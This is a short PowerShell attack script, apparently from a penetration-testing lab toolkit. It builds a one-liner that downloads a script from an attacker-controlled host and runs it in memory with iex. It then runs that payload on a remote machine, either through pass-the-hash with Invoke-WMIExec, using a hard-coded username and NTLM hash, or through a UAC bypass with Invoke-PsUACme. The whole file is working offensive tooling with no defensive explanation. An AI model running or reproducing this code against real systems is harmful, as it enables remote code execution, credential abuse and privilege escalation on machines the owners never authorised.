# author: WatchDogOblivion
# description: TODO

param (
    [string]$LHost = "192.168.119.133",
    [string]$LPort = "80",
    [string]$File = "ipwsh.ps1",
    [string]$RHost = "10.11.1.122",

    [switch]$WMIExec = $false,
    [string]$User = "daisy",
    [string]$Hash = "f6084ca1a4905c45747d4bdcc1fcab84",

    [switch]$UAC = $false,
    [string]$Method = "oobe"
)

$Command = "powershell -c `"iex(new-object net.webclient).downloadstring('http://$LHost`:$LPort/$File')`""
if ($WMIExec) {
    Import-Module $PSScriptRoot\lib\pth\Invoke-WMIExec.ps1
    Invoke-WMIExec -Target $RHost -Domain xor -Username $User -Hash $Hash -Command "$Command"    
}
elseif ($UAC) {
    Import-Module $PSScriptRoot\lib\other\Invoke-PsUACme.ps1
    Invoke-PsUACme -method $Method -Payload $Command        
}
